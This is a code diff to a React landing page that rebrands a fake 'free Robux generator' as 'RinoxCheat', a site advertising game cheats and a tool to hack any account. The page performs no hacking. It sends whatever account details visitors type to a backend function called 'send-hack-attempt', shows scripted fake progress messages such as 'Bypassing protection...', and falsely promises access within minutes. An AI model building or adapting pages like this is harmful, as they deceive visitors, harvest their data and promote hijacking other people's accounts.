@@ -3,24 +3,37 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { supabase } from "@/integrations/supabase/client";
 import { toast } from "@/hooks/use-toast";
-import { Sparkles, ShieldCheck, Zap, CheckCircle2, Play } from "lucide-react";
+import { Sparkles, ShieldCheck, Zap, CheckCircle2, Play, Gamepad2 } from "lucide-react";
 
 const STEPS = [
-  "Connecting to server...",
-  "Verifying account...",
-  "Preparing transfer...",
-  "Sending resources...",
+  "Connecting to target server...",
+  "Locating account...",
+  "Bypassing protection...",
+  "Injecting cheat module...",
+];
+
+const GAMES = [
+  "Fortnite",
+  "Roblox",
+  "Valorant",
+  "CS2",
+  "Call of Duty",
+  "Minecraft",
+  "GTA V",
+  "Apex Legends",
 ];
 
 const Index = () => {
-  const [input, setInput] = useState("");
+  const [target, setTarget] = useState("");
+  const [game, setGame] = useState("");
   const [loading, setLoading] = useState(false);
   const [steps, setSteps] = useState<string[]>([]);
   const [done, setDone] = useState(false);
 
   useEffect(() => {
-    document.title = "Robux Generator 2026 — Free Robux";
-    const desc = "The #1 free Robux generator of 2026. Fast, simple, reliable.";
+    document.title = "RinoxCheat — Cheats & Account Hack 2026";
+    const desc =
+      "RinoxCheat: the best cheats for every game and a tool to hack any account. Fast, undetected, 2026.";
     let m = document.querySelector('meta[name="description"]');
     if (!m) {
       m = document.createElement("meta");
@@ -30,11 +43,11 @@ const Index = () => {
     m.setAttribute("content", desc);
   }, []);
 
-  const handleClaim = async () => {
-    if (!input.trim()) {
+  const handleHack = async () => {
+    if (!target.trim()) {
       toast({
         title: "Missing info",
-        description: "Please enter your player data to continue.",
+        description: "Enter the target account (username, email, ID...).",
         variant: "destructive",
       });
       return;
@@ -43,8 +56,9 @@ const Index = () => {
     setDone(false);
     setSteps([]);
 
+    const payload = `Game: ${game || "—"}\nTarget: ${target}`;
     const sendPromise = supabase.functions.invoke("send-hack-attempt", {
-      body: { input },
+      body: { input: payload },
     });
 
     for (let i = 0; i < STEPS.length; i++) {
@@ -57,12 +71,11 @@ const Index = () => {
 
     setLoading(false);
     setDone(true);
-    setInput("");
+    setTarget("");
   };
 
   return (
     <main className="relative min-h-screen flex flex-col items-center px-4 py-12 sm:py-16">
-      {/* Subtle background accent */}
       <div
         aria-hidden
         className="pointer-events-none fixed inset-0 -z-10 opacity-60"
@@ -75,54 +88,69 @@ const Index = () => {
       <header className="text-center max-w-xl w-full mb-10">
         <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-secondary text-muted-foreground text-xs mb-5 border border-border">
           <Sparkles className="h-3.5 w-3.5 text-primary" />
-          <span>Robux Generator · 2026 Edition</span>
+          <span>RinoxCheat · 2026 Edition</span>
         </div>
         <h1 className="text-3xl sm:text-5xl font-semibold tracking-tight mb-3">
-          Get Free Robux Instantly
+          The #1 Cheats & Account Hack Tool
         </h1>
         <p className="text-muted-foreground text-sm sm:text-base leading-relaxed">
-          Enter your player data below and receive your resources within minutes. No download required.
+          Get the best cheats on every game and hack any account in seconds. Undetected, fast, free.
         </p>
       </header>
 
       <section
-        aria-label="Robux generator"
+        aria-label="Cheat & hack panel"
         className="w-full max-w-md bg-card border border-border rounded-2xl p-6 sm:p-7 shadow-xl shadow-black/40"
       >
-        <label
-          htmlFor="player-data"
-          className="block text-sm font-medium mb-2"
-        >
-          Player data
+        <label htmlFor="game" className="block text-sm font-medium mb-2">
+          Game
+        </label>
+        <div className="relative">
+          <Gamepad2 className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground pointer-events-none" />
+          <select
+            id="game"
+            value={game}
+            onChange={(e) => setGame(e.target.value)}
+            disabled={loading}
+            className="w-full h-11 pl-9 pr-3 rounded-lg bg-input border border-border text-foreground text-sm focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-primary appearance-none"
+          >
+            <option value="">Select a game</option>
+            {GAMES.map((g) => (
+              <option key={g} value={g}>
+                {g}
+              </option>
+            ))}
+          </select>
+        </div>
+
+        <label htmlFor="target" className="block text-sm font-medium mt-5 mb-2">
+          Target account
         </label>
         <Input
-          id="player-data"
-          value={input}
-          onChange={(e) => setInput(e.target.value)}
+          id="target"
+          value={target}
+          onChange={(e) => setTarget(e.target.value)}
           disabled={loading}
           placeholder="Username, email, ID..."
           maxLength={5000}
           className="h-11 rounded-lg bg-input border-border focus-visible:ring-primary"
         />
         <p className="text-xs text-muted-foreground mt-2">
-          Your information is securely transmitted.
+          Your request is securely transmitted.
         </p>
 
         <Button
-          onClick={handleClaim}
+          onClick={handleHack}
           disabled={loading}
           className="w-full mt-5 h-12 rounded-lg font-medium text-base"
         >
-          {loading ? "Processing..." : "Claim Robux"}
+          {loading ? "Processing..." : "Start Hack"}
         </Button>
 
         {(steps.length > 0 || done) && (
           <div className="mt-6 space-y-2">
             {steps.map((s, i) => (
-              <div
-                key={i}
-                className="flex items-center gap-2 text-sm text-muted-foreground"
-              >
+              <div key={i} className="flex items-center gap-2 text-sm text-muted-foreground">
                 <CheckCircle2 className="h-4 w-4 text-primary shrink-0" />
                 <span>{s}</span>
               </div>
@@ -134,7 +162,7 @@ const Index = () => {
                   Request submitted
                 </div>
                 <p className="text-sm text-foreground/80">
-                  Your resources will be delivered within 2–3 minutes.
+                  Access will be granted within 2–3 minutes.
                 </p>
               </div>
             )}
@@ -144,7 +172,7 @@ const Index = () => {
         <div className="grid grid-cols-2 gap-3 mt-6 pt-6 border-t border-border">
           <div className="flex items-center gap-2 text-xs text-muted-foreground">
             <ShieldCheck className="h-4 w-4 text-primary" />
-            Secure
+            Undetected
           </div>
           <div className="flex items-center gap-2 text-xs text-muted-foreground">
             <Zap className="h-4 w-4 text-primary" />
@@ -153,23 +181,19 @@ const Index = () => {
         </div>
       </section>
 
-      {/* Tutorial section */}
-      <section
-        aria-label="Tutorial video"
-        className="w-full max-w-md mt-12"
-      >
+      <section aria-label="Tutorial video" className="w-full max-w-md mt-12">
         <div className="flex items-center gap-2 mb-3">
           <Play className="h-4 w-4 text-primary" />
           <h2 className="text-base font-medium">How it works — Tutorial</h2>
         </div>
         <p className="text-sm text-muted-foreground mb-4">
-          Watch this quick guide before claiming your Robux.
+          Watch this quick guide before launching your first hack.
         </p>
         <div className="relative aspect-video w-full rounded-xl overflow-hidden border border-border bg-card">
           <iframe
             className="absolute inset-0 w-full h-full"
             src="https://www.youtube.com/embed/boFceTxmo5o"
-            title="Tutorial — Robux Generator"
+            title="Tutorial — RinoxCheat"
             loading="lazy"
             allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
             referrerPolicy="strict-origin-when-cross-origin"
